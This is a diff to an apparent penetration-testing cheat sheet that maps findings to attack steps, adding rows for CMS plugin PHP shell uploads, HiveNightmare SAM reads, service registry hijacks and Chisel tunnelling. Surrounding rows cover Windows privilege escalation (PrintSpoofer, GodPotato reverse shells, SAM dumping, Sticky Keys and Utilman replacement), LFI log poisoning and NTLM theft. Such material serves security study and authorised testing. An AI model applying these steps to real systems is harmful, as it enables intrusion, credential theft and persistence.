@@ -18,6 +18,7 @@ This matrix is designed for rapid triage. When you see a specific "indicator" or
 | **FileUpload (Blocked .php)** | Upload `.htaccess` with `AddType` directive | Bypass extension filters |
 | **Writable SMB Share** | Upload `.lnk` file via `ntlm_theft.py` | Force NTLM authentication (Responder) |
 | **Web Service (Anonymous)** | `cadaver http://10.10.10.10` | Check for WebDAV PUT/MOVE permissions |
+| **CMS Admin Access** | Upload PHP shell via Plugin/Extension/Theme | RCE on web server |
 | **LFI (No Wrappers)** | Check `/var/log/apache2/access.log` (Poison UA) | LFI-to-RCE via Log Poisoning |
 | **Port 1433 Cracked** | `mssqlclient ...` then check `IMPERSONATE` rights | Escalation within SQL to Admin/System |
 
@@ -49,11 +50,14 @@ This matrix is designed for rapid triage. When you see a specific "indicator" or
 | :--- | :--- | :--- |
 | **SeImpersonate** | `PrintSpoofer.exe -c "cmd.exe" -i` | SYSTEM Shell |
 | **SeImpersonate (Newer OS)** | `GodPotato.exe -cmd "rev_shell_cmd"` | SYSTEM Shell |
+| **Win 10 Build 1809-19043** | **HiveNightmare**: `.\HiveNightmare.exe` | Read SAM/SECURITY as user |
 | **SeBackup** | `reg save hklm\sam SAM` then `secretsdump` local | Local Admin Hashes |
 | **SeRestore** | `ren Utilman.exe ...` -> Replace with `cmd.exe` | SYSTEM Shell at Login Screen |
 | **SeManageVolume** | `SeManageVolumeExploit.exe` -> `tzres.dll` Hijack | SYSTEM Shell via `systeminfo` |
 | **SeTakeOwnership** | Take ownership of `C:\Windows\System32\sethc.exe` | Persistence / Hijack (Sticky Keys) |
 | **Unquoted Service Path** | `wmic service get pathname` (Look for spaces and no quotes) | Hijack binary path for SYSTEM shell |
+| **Modifiable Reg Key** | `Set-ItemProperty -Path HKLM:\...\Services\X -Name ImagePath ...` | Service Hijack (SYSTEM shell) |
+| **Local Port 8080/8443** | `netstat -ano \| findstr LISTENING` | Tunnel via Chisel to access internal web apps |
 
 ---
 
